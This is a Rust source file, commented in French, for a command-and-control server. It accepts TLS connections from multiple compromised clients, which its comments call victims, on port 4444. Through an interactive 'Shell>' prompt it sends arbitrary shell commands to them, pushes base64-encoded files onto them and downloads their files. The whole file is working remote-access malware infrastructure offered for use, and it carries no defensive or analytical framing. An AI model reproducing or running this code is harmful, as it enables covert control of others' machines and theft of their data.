use std::fs::File;
use std::io::{self, Write, BufRead, BufReader, Read};
use std::net::TcpListener;
use native_tls::{Identity, TlsAcceptor};
use std::thread;
use std::sync::Arc;
use base64::{Engine as _, engine::general_purpose};

/// Point d'entrée du Serveur Command & Control (C2).
/// Gère les connexions multi-clients via TLS et dispatch les commandes.
fn main() {
    println!("Démarrage du Serveur C2 en Rust (Mode Robuste & Base64)...");

    // ========================================================================
    // 1. CHARGEMENT DE L'IDENTITÉ CRYPTOGRAPHIQUE
    // ========================================================================
    
    // On charge le certificat PKCS12 (.pfx) qui contient la clé publique et privée.
    // Gestion d'erreur explicite pour éviter un panic moche au lancement.
    let mut file = match File::open("identity.pfx") {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Impossible d'ouvrir 'identity.pfx': {}", e);
            return;
        }
    };

    let mut identity_bytes = vec![];
    if let Err(e) = file.read_to_end(&mut identity_bytes) {
        eprintln!("[-] ERREUR FATALE: Lecture du fichier PFX échouée: {}", e);
        return;
    }
    
    // Déchiffrement de l'identité.
    // TODO: Ne pas hardcoder le mot de passe dans une vraie version (utiliser args ou env var).
    let identity = match Identity::from_pkcs12(&identity_bytes, "password") {
        Ok(id) => id,
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Mauvais mot de passe ou fichier PFX corrompu: {}", e);
            return;
        }
    };

    // Création de l'accepteur TLS.
    // On l'enveloppe dans un Arc (Atomic Reference Counting) pour pouvoir le partager
    // entre plusieurs threads (clients) sans avoir à le cloner en mémoire.
    let acceptor = match TlsAcceptor::new(identity) {
        Ok(acc) => Arc::new(acc),
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Création TlsAcceptor impossible: {}", e);
            return;
        }
    };

    // ========================================================================
    // 2. ÉCOUTE RÉSEAU (SOCKET)
    // ========================================================================
    
    // Bind sur 0.0.0.0 pour écouter sur toutes les interfaces (Docker, LAN, etc.)
    let listener = match TcpListener::bind("0.0.0.0:4444") {
        Ok(l) => l,
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Impossible d'écouter sur le port 4444: {}", e);
            return;
        }
    };

    println!("[*] En écoute sur le port 4444 (TLS)...");

    // Boucle infinie d'acceptation des clients
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                // On clone la référence Arc (coût faible) pour la passer au thread
                let acceptor = acceptor.clone();
                
                // Spawn d'un nouveau thread pour gérer ce client spécifiquement.
                // Cela permet au serveur de gérer plusieurs victimes en parallèle sans bloquer.
                thread::spawn(move || {
                    println!("[*] Connexion entrante...");
                    
                    // Handshake TLS : C'est ici que l'échange de clés se fait.
                    match acceptor.accept(stream) {
                        Ok(stream) => {
                            println!("[+] Session TLS établie !");
                            let mut reader = BufReader::new(stream);
                            
                            // Boucle d'interaction REPL avec CE client
                            loop {
                                print!("Shell> ");
                                let _ = io::stdout().flush(); // Force l'affichage du prompt
                                
                                let mut command = String::new();
                                if let Err(e) = io::stdin().read_line(&mut command) {
                                    println!("[-] Erreur lecture clavier: {}", e);
                                    break;
                                }
                                let command = command.trim().to_string();

                                if command.is_empty() { continue; }
                                if command == "exit" { break; }

                                // --- LOGIQUE ENVOI (UPLOAD) ---
                                let mut final_command = command.clone();
                                let mut skip_sending = false;

                                // Si c'est un upload, on doit lire le fichier local et l'encoder AVANT l'envoi.
                                if command.starts_with("upload") {
                                    let parts: Vec<&str> = command.split_whitespace().collect();
                                    if parts.len() >= 2 {
                                        let local_path = parts[1];
                                        // Si pas de nom distant précisé, on garde le même nom
                                        let remote_name = if parts.len() > 2 { parts[2] } else { local_path };
                                        
                                        match std::fs::read(local_path) {
                                            Ok(content) => {
                                                // Encodage Base64 pour éviter la corruption binaire via le flux texte
                                                let b64 = general_purpose::STANDARD.encode(&content);
                                                final_command = format!("upload {} {}", b64, remote_name);
                                                println!("[+] Upload: Envoi de {} octets encodés...", content.len());
                                            },
                                            Err(e) => { 
                                                println!("[-] Erreur fichier local: {}", e); 
                                                skip_sending = true; 
                                            }
                                        }
                                    } else {
                                        println!("[-] Usage: upload <local> [distant]");
                                        skip_sending = true;
                                    }
                                }

                                if skip_sending { continue; }

                                // Envoi de la commande dans le tunnel TLS.
                                // On utilise reader.get_mut() pour récupérer l'accès en écriture au stream sous-jacent.
                                if let Err(e) = reader.get_mut().write_all(format!("{}\n", final_command).as_bytes()) {
                                    println!("[-] Erreur d'envoi (Client déconnecté ?): {}", e);
                                    break;
                                }

                                // --- RÉCEPTION RÉPONSE ---
                                let mut buffer = String::new();
                                match reader.read_line(&mut buffer) {
                                    Ok(n) => {
                                        if n == 0 { break; } // Le client a fermé la connexion (FIN sent)
                                        let received_b64 = buffer.trim();

                                        if command.starts_with("download") {
                                            // Décodage du payload reçu (fichier binaire encodé)
                                            match general_purpose::STANDARD.decode(received_b64) {
                                                Ok(bytes) => {
                                                    // On check si le contenu décodé est un message d'erreur textuel
                                                    let preview = String::from_utf8_lossy(&bytes);
                                                    if preview.starts_with("ERROR:") {
                                                        println!("[-] {}", preview);
                                                    } else {
                                                        // Extraction propre du nom de fichier (gestion slash Linux vs backslash Windows)
                                                        let parts: Vec<&str> = command.split_whitespace().collect();
                                                        if parts.len() >= 2 {
                                                            let raw_path = parts[1];
                                                            let filename = raw_path.split(|c| c == '\\' || c == '/').last().unwrap_or("downloaded_file.bin");

                                                            match File::create(filename) {
                                                                Ok(mut file) => {
                                                                    if let Err(e) = file.write_all(&bytes) {
                                                                        println!("[-] Erreur écriture disque: {}", e);
                                                                    } else {
                                                                        println!("[+] Fichier '{}' reçu ({} octets) !", filename, bytes.len());
                                                                    }
                                                                },
                                                                Err(e) => println!("[-] Erreur création fichier: {}", e),
                                                            }
                                                        }
                                                    }
                                                },
                                                Err(e) => println!("[-] Erreur décodage Base64 Download: {}", e),
                                            }
                                        } else {
                                            // Cas standard : Affichage du résultat d'une commande shell
                                            match general_purpose::STANDARD.decode(received_b64) {
                                                Ok(bytes) => {
                                                    // On utilise lossy pour ne pas crash sur des caractères non-UTF8
                                                    let response = String::from_utf8_lossy(&bytes);
                                                    println!("{}", response);
                                                },
                                                Err(_) => {
                                                    // Fallback : affichage brut si ce n'était pas du B64
                                                    println!("{}", buffer);
                                                }
                                            }
                                        }
                                    },
                                    Err(e) => {
                                        println!("[-] Erreur lecture socket: {}", e);
                                        break;
                                    }
                                }
                            }
                        },
                        Err(e) => println!("[-] Handshake TLS échoué: {}", e),
                    }
                });
            }
            Err(e) => println!("[-] Erreur connexion TCP: {}", e),
        }
    }
}